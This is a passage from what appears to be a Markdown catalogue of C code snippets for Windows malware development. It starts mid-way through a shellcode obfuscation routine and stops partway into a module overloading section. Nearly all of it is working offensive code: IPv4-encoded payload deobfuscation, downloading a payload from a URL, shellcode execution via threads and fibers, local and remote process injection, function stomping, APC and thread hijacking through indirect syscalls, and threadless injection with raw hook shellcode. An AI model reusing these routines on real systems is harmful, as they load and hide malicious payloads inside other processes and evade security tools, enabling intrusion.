				pNewPaddedShellcode[i + 0x8], pNewPaddedShellcode[i + 0x9], pNewPaddedShellcode[i + 0xA], pNewPaddedShellcode[i + 0xB],
				pNewPaddedShellcode[i + 0xC], pNewPaddedShellcode[i + 0xD], pNewPaddedShellcode[i + 0xE], pNewPaddedShellcode[i + 0xF],
				UUID
			);

			if (i == sNewPaddedSize - 16)
				printf("\"%s\"", UUID);
			else
				printf("\"%s\", ", UUID);

			if (j % 3 == 0)
				printf("\n\t");

		}
	}

	printf("\n};\n");
}
```
### Payload Deobfuscation Via IPv4Deobfuscation
```c
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(PCSTR S, BOOLEAN	Strict, PCSTR* Terminator, PVOID Addr);

BOOL Ipv4Deobfuscation(IN CHAR* cIPv4Array[], IN SIZE_T sNmbrOfElements, OUT PBYTE* ppDeobfuscatedBuffer, OUT SIZE_T* psDeobfuscatedSize) {

	NTSTATUS					STATUS						= 0x00;
	fnRtlIpv4StringToAddressA	pRtlIpv4StringToAddressA	= NULL;
	PBYTE						pDeobfuscatedBuff			= NULL,
								pTmpBufferPntr				= NULL;
	PCSTR						Terminator					= NULL;
	HMODULE						hNtdll						= NULL;

	if (!(hNtdll = GetModuleHandle(L"ntdll"))) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if ((pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(hNtdll, "RtlIpv4StringToAddressA")) == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	*psDeobfuscatedSize = sNmbrOfElements * 4;

	if ((pTmpBufferPntr = pDeobfuscatedBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psDeobfuscatedSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	for (int i = 0; i < sNmbrOfElements; i++) {

		if ((STATUS = pRtlIpv4StringToAddressA(cIPv4Array[i], FALSE, &Terminator, pTmpBufferPntr)) != 0x0) {
			printf("[!] RtlIpv4StringToAddressA Failed With Error 0x%0.8X", STATUS);
			return FALSE;
		}

		pTmpBufferPntr = (PBYTE)(pTmpBufferPntr + 4);
	}

	*ppDeobfuscatedBuffer = pDeobfuscatedBuff;

	return TRUE;
}
```
### Fetch a Payload Via URL (Unicode)
```c
#include <windows.h>
#include <Wininet.h>
#include <stdio.h>
#pragma comment(lib, "Wininet.lib")

BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {


	HINTERNET	hInternet			= NULL,
				hInternetFile		= NULL;

	PBYTE 		pTmpPntr			= NULL,
				pFileBuffer			= NULL;
	DWORD		dwTmpBytesRead		= 0x00,
				dwFileSize			= 0x00;

	if (!ppFileBuffer || !pdwFileSize)
		return FALSE;

	if (!(hInternet = InternetOpenW(NULL, 0x00, NULL, NULL, 0x00))) {
		printf("[!] InternetOpenW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hInternetFile = InternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
		printf("[!] InternetOpenUrlW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntr = LocalAlloc(LPTR, 1024))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}


	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpPntr, 1024, &dwTmpBytesRead)) {
			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		dwFileSize += dwTmpBytesRead;

		if (!pFileBuffer)
			pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
		else
			pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (!pFileBuffer) {
			printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}

		memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPntr, dwTmpBytesRead);
		memset(pTmpPntr, 0x00, dwTmpBytesRead);

		if (dwTmpBytesRead < 1024)
			break;
	}

	*ppFileBuffer = pFileBuffer;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (pTmpPntr)
		LocalFree(pTmpPntr);
	if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)
		LocalFree(pFileBuffer);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}
```
### Fetch a Payload Via URL (ASCII)
```c
#include <windows.h>
#include <stdio.h>
#include <Wininet.h>
#pragma comment(lib, "Wininet.lib")

BOOL FetchFileFromURLA(IN LPCSTR cFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {


	HINTERNET	hInternet			= NULL,
				hInternetFile		= NULL;

	PBYTE 		pTmpPntr			= NULL,
				pFileBuffer			= NULL;
	DWORD		dwTmpBytesRead		= 0x00,
				dwFileSize			= 0x00;

	if (!ppFileBuffer || !pdwFileSize)
		return FALSE;

	if (!(hInternet = InternetOpenA(NULL, 0x00, NULL, NULL, 0x00))) {
		printf("[!] InternetOpenA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hInternetFile = InternetOpenUrlA(hInternet, cFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
		printf("[!] InternetOpenUrlA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntr = LocalAlloc(LPTR, 1024))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}


	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpPntr, 1024, &dwTmpBytesRead)) {
			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		dwFileSize += dwTmpBytesRead;

		if (!pFileBuffer)
			pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
		else
			pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (!pFileBuffer) {
			printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}

		memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPntr, dwTmpBytesRead);
		memset(pTmpPntr, 0x00, dwTmpBytesRead);

		if (dwTmpBytesRead < 1024)
			break;
	}

	*ppFileBuffer	= pFileBuffer;
	*pdwFileSize	= dwFileSize;

_END_OF_FUNC:
	if (pTmpPntr)
		LocalFree(pTmpPntr);
	if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)
		LocalFree(pFileBuffer);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternet)
		InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}
```
### Payload Execution Via Fibers (2)
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecPayloadViaFibers(IN ULONG_PTR uShellcodeAddr, IN OPTIONAL ULONG_PTR uParameter) {

	BOOL	bResult					= FALSE;
	LPVOID	PrimaryFiberAddress		= NULL,
			ShellcodeFiberAddress	= NULL;

	if (!(ShellcodeFiberAddress = CreateFiber(0x00, (LPFIBER_START_ROUTINE)uShellcodeAddr, uParameter))) {
		printf("[!] CreateFiber Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(PrimaryFiberAddress = ConvertThreadToFiber(NULL))) {
		printf("[!] ConvertThreadToFiber Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	SwitchToFiber(ShellcodeFiberAddress);

	if (!SwitchToThread()) {
		printf("[!] SwitchToThread Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (ShellcodeFiberAddress)
		DeleteFiber(ShellcodeFiberAddress);
	if (PrimaryFiberAddress)
		DeleteFiber(PrimaryFiberAddress);
	return bResult;
}
```
### SignalObjectAndWait Alertable Function
```c
#include <windows.h>
VOID AlertableFunction5() {

	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);

	if (hEvent1 && hEvent2) {
		SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
}
```
### MsgWaitForMultipleObjectsEx Alertable Function
```c
#include <windows.h>
VOID AlertableFunction4() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
		MsgWaitForMultipleObjectsEx(1, &hEvent, INFINITE, QS_KEY, MWMO_ALERTABLE);
		CloseHandle(hEvent);
	}
}
```
### Local Function Stomping
```c
#include <windows.h>
#include <stdio.h>
BOOL WritePayloadLocally(IN PVOID pBaseAddress, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize) {

	if (!pBaseAddress || !pShellcodeAddress || !sShellcodeSize)
		return FALSE;

	DWORD		dwOldProtection		= 0x00;

	if (!VirtualProtect(pBaseAddress, sShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	memcpy(pBaseAddress, pShellcodeAddress, sShellcodeSize);

	if (!VirtualProtect(pBaseAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### WaitForMultipleObjectsEx Alertable Function
```c
#include <windows.h>
VOID AlertableFunction3() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
		WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
}
```
### Local Shellcode Execution
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecuteShellcodeInLocalProcess(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress			= NULL;
	DWORD		dwOldProtection		= 0x00;
	HANDLE		hThread				= NULL;

	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(pAddress = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pShellcodeAddress, sShellcodeSize);

	if (!(hThread = CreateThread(NULL, 0x00, pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	*ppInjectionAddress		= pAddress;
	if (phThread)
		*phThread			= hThread;

//	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}
```
### WaitForSingleObjectEx Alertable Function
```c
#include <windows.h>
VOID AlertableFunction2() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
		WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
}
```
### Local Mapping Injection
```c
#include <windows.h>
#include <stdio.h>
BOOL LocalMappingInjection(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress) {

	HANDLE		hMappingFile		= NULL;
	PBYTE		pMappingAddress		= NULL;

	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(hMappingFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pMappingAddress = MapViewOfFile(hMappingFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0x00, 0x00, sShellcodeSize))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	*ppInjectionAddress = memcpy(pMappingAddress, pShellcodeAddress, sShellcodeSize);

_END_OF_FUNC:
	if (hMappingFile)
		CloseHandle(hMappingFile);
	return (*ppInjectionAddress) ? TRUE : FALSE;
}
```
### APC Queues Execution Via HellsHall
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

// Calculated CRC Hash Value
#define NtQueueApcThread_CRC32   0x67399CDF

BOOL ApcPayloadExecViaIndirectSyscalls(IN HANDLE hAlertableThread, IN PVOID pStartAddress, IN OPTIONAL ULONG_PTR uParameter) {

	if (!hAlertableThread || !pStartAddress)
		return FALSE;

	NT_SYSCALL		NtQueueApcThread		= { 0 };
	NTSTATUS		STATUS					= 0x00;

	if (!FetchNtSyscall(NtQueueApcThread_CRC32, &NtQueueApcThread)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThread \n");
		return FALSE;
	}

	SET_SYSCALL(NtQueueApcThread);
	if (!NT_SUCCESS((STATUS = RunSyscall(hAlertableThread, pStartAddress, uParameter, NULL, NULL)))) {
		printf("[!] NtQueueApcThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```
### Thread Hijacking Via HellsHall
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

// Calculated CRC Hash Values
#define NtSuspendThread_CRC32		0xD7288A6E
#define NtGetContextThread_CRC32    0xC402D0FC
#define NtSetContextThread_CRC32    0xF614A2E5
#define NtResumeThread_CRC32		0xD67413A8

// -------------------------------- //// -------------------------------- //// -------------------------------- //

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtSuspendThread;
	NT_SYSCALL	NtGetContextThread;
	NT_SYSCALL	NtSetContextThread;
	NT_SYSCALL	NtResumeThread;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtSuspendThread_CRC32, &g_NTAPI.NtSuspendThread)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtSuspendThread \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtGetContextThread_CRC32, &g_NTAPI.NtGetContextThread)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtGetContextThread \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtSetContextThread_CRC32, &g_NTAPI.NtSetContextThread)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtSetContextThread \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtResumeThread_CRC32, &g_NTAPI.NtResumeThread)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtResumeThread \n");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL HijackTargetThreadViaIndirectSyscalls(IN HANDLE hThread, IN PVOID pStartAddress) {

	if (!hThread || !pStartAddress)
		return FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	CONTEXT		ThreadCtx	= { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };
	NTSTATUS	STATUS		= 0x00;

	SET_SYSCALL(g_NTAPI.NtSuspendThread);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, NULL)))) {
		printf("[!] NtSuspendThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtGetContextThread);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, &ThreadCtx)))) {
		printf("[!] NtGetContextThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	ThreadCtx.Rip = pStartAddress;

	SET_SYSCALL(g_NTAPI.NtSetContextThread);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, &ThreadCtx)))) {
		printf("[!] NtSetContextThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtResumeThread);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, NULL)))) {
		printf("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```
### SleepEx Alertable Function
```c
#include <windows.h>
VOID AlertableFunction1() {
	SleepEx(INFINITE, TRUE);
}
```
### Remote Function Stomping
```c
#include <windows.h>
#include <stdio.h>
BOOL WritePayloadRemotely(IN HANDLE hProcess, IN PVOID pBaseAddress, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize) {

	if (!hProcess || !pBaseAddress || !pShellcodeAddress || !sShellcodeSize)
		return FALSE;

	DWORD		dwOldProtection			= 0x00;
	SIZE_T		NumberOfBytesWritten	= 0x00;

	if (!VirtualProtectEx(hProcess, pBaseAddress, sShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pBaseAddress, pShellcodeAddress, sShellcodeSize, &NumberOfBytesWritten) || sShellcodeSize != NumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[!] Wrote %d Of %d Bytes\n", (int)NumberOfBytesWritten, (int)sShellcodeSize);
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pBaseAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Remote Mapping Injection
```c
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "Onecore.lib")

BOOL RemoteMappingInjection(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress) {

	HANDLE		hMappingFile			= NULL;
	PBYTE		pLocalMappingAddress	= NULL,
				pRemoteMappingAddress	= NULL;

	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(hMappingFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pLocalMappingAddress = MapViewOfFile(hMappingFile, FILE_MAP_WRITE, 0x00, 0x00, sShellcodeSize))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	memcpy(pLocalMappingAddress, pShellcodeAddress, sShellcodeSize);

	if (!(pRemoteMappingAddress = MapViewOfFile2(hMappingFile, hProcess, 0x00, NULL, 0x00, 0x00, PAGE_EXECUTE_READWRITE))) {
		printf("[!] MapViewOfFile2 Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	*ppInjectionAddress = pRemoteMappingAddress;

_END_OF_FUNC:
	if (hMappingFile)
		CloseHandle(hMappingFile);
	return (*ppInjectionAddress) ? TRUE : FALSE;
}
```
### Remote Shellcode Execution
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecuteShellcodeInRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress			= NULL;
	HANDLE		hThread				= NULL;
	DWORD		dwOldProtection		= 0x00;
	SIZE_T		sNmbrOfBytesWritten = NULL;

	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(pAddress = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pShellcodeAddress, sShellcodeSize, &sNmbrOfBytesWritten) || sShellcodeSize != sNmbrOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d\n[i] Wrote %d Of %d Bytes \n", GetLastError(), (int)sNmbrOfBytesWritten, (int)sShellcodeSize);
		return FALSE;
	}

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0x00, pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateRemoteThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	*ppInjectionAddress		= pAddress;
	if (phThread)
		*phThread			= hThread;

//	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}
```
### Threadless Injection
```c
#include <windows.h>
#include <stdio.h>
#define STATUS_SUCCESS	    0x00000000
#define NT_SUCCESS(STATUS)	(((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(
	IN		HANDLE			ProcessHandle,
	IN OUT	PVOID*			BaseAddress,
	IN		ULONG_PTR		ZeroBits,
	IN OUT	PSIZE_T			RegionSize,
	IN		ULONG			AllocationType,
	IN		ULONG			Protect
	);

typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
	IN		HANDLE		ProcessHandle,
	IN OUT	PVOID*		BaseAddress,
	IN OUT	PSIZE_T		NumberOfBytesToProtect,
	IN		ULONG		NewAccessProtection,
	OUT		PULONG		OldAccessPRotection
	);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
	IN	HANDLE	ProcessHandle,
	IN	PVOID	BaseAddress,
	IN	PVOID	Buffer,
	IN	ULONG	NumberOfBytesToWrite,
	OUT PULONG	NumberOfBytesWritten OPTIONAL
	);

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NT_API {

	fnNtAllocateVirtualMemory			pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory			pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory				pNtWriteVirtualMemory;

}NT_API, * PNT_API;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API g_NtApi = { 0x00 };

// ==========================================================================================================================================================
// ==========================================================================================================================================================


BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll		= NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtAllocateVirtualMemory	= (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	g_NtApi.pNtProtectVirtualMemory		= (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	g_NtApi.pNtWriteVirtualMemory		= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

	if (!g_NtApi.pNtAllocateVirtualMemory || !g_NtApi.pNtProtectVirtualMemory || !g_NtApi.pNtWriteVirtualMemory)
		return FALSE;
	else
		return TRUE;
}

// ==========================================================================================================================================================


BOOL ThreadlessInject(IN HANDLE hProcess, IN ULONG_PTR uTargetFuncAddress, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeLength) {

	if (!hProcess || !uTargetFuncAddress || !pShellcodeBuffer || !sShellcodeLength)
		return FALSE;

	NTSTATUS			STATUS				= STATUS_SUCCESS;
	ULONG_PTR			uTmpPntrVar			= NULL,
						uMemoryHole			= NULL;
	SIZE_T				sTmpSizeVar			= NULL,
						sNmbrOfBytesWritten	= NULL;
	DWORD				dwOldProtection		= 0x00;
	unsigned long long	ullOriginalBytes	= *(unsigned long long*)uTargetFuncAddress;
	unsigned char		uTrampoline[5]		= { 0xE8, 0x00, 0x00, 0x00, 0x00 };
	unsigned long		ullRVA				= 0x00;
	unsigned char		HookShellcode[63]	= {
		0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
	};

	if (!InitializeSyscallsStruct())
		return FALSE;

	memcpy(&HookShellcode[22], &ullOriginalBytes, sizeof(ullOriginalBytes));

	sTmpSizeVar = sShellcodeLength + sizeof(HookShellcode);

	for (uTmpPntrVar = (uTargetFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000; uTmpPntrVar < uTargetFuncAddress + 0x70000000; uTmpPntrVar += 0x10000) {

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtAllocateVirtualMemory(hProcess, &uTmpPntrVar, 0x00, &sTmpSizeVar, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))))
			continue;

		uMemoryHole = uTmpPntrVar;
		break;
	}

	if (!uMemoryHole)
		return FALSE;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, uMemoryHole, HookShellcode, sizeof(HookShellcode), &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sizeof(HookShellcode)) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sizeof(HookShellcode));
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, (uMemoryHole + sNmbrOfBytesWritten), pShellcodeBuffer, sShellcodeLength, &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sShellcodeLength) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sShellcodeLength);
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &uMemoryHole, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	ullRVA			= (unsigned long)((ULONG_PTR)uMemoryHole - (uTargetFuncAddress + sizeof(uTrampoline)));
	uTmpPntrVar		= uTargetFuncAddress;
	sTmpSizeVar		= sizeof(uTrampoline);

	memcpy(&uTrampoline[1], &ullRVA, sizeof(ullRVA));

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &uTmpPntrVar, &sTmpSizeVar, PAGE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, uTargetFuncAddress, uTrampoline, sizeof(uTrampoline), &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sizeof(uTrampoline)) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sShellcodeLength);
		return FALSE;
	}

	uTmpPntrVar		= uTargetFuncAddress;
	sTmpSizeVar		= sizeof(uTrampoline);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &uTmpPntrVar, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	return TRUE;
}
```
### Module Overloading
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
	OUT PHANDLE				SectionHandle,
	IN  ACCESS_MASK			DesiredAccess,
	IN  POBJECT_ATTRIBUTES	ObjectAttributes	OPTIONAL,
	IN  PLARGE_INTEGER		MaximumSize			OPTIONAL,
